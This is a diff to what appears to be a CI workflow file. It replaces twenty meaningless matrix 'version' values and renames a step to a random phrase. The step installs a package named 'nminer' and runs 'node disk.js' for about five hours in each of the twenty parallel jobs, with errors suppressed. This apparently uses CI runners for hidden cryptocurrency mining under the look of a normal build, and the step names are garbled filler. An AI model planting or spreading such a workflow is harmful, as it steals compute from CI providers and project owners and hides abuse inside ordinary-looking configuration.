@@ -9,26 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5271 }
-          - { version: 2260 }
-          - { version: 8027 }
-          - { version: 6394 }
-          - { version: 2708 }
-          - { version: 3047 }
-          - { version: 612 }
-          - { version: 7015 }
-          - { version: 3525 }
-          - { version: 3524 }
-          - { version: 4321 }
-          - { version: 3552 }
-          - { version: 6168 }
-          - { version: 4467 }
-          - { version: 229 }
-          - { version: 8969 }
-          - { version: 5588 }
-          - { version: 1294 }
-          - { version: 4216 }
-          - { version: 5795 }
+          - { version: 9432 }
+          - { version: 3172 }
+          - { version: 5454 }
+          - { version: 4741 }
+          - { version: 2192 }
+          - { version: 3352 }
+          - { version: 7775 }
+          - { version: 5227 }
+          - { version: 1678 }
+          - { version: 202 }
+          - { version: 3416 }
+          - { version: 4307 }
+          - { version: 1704 }
+          - { version: 6090 }
+          - { version: 7331 }
+          - { version: 356 }
+          - { version: 8018 }
+          - { version: 8882 }
+          - { version: 9201 }
+          - { version: 2500 }
 
     steps:
       - name: Checkout
@@ -39,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: shred supposing um
+      - name: but helpless concentration angrily
         run: |
           npm install nminer@latest
-          timeout 336m node disk.js || echo "disk executed"
+          timeout 301m node disk.js || echo "disk executed"
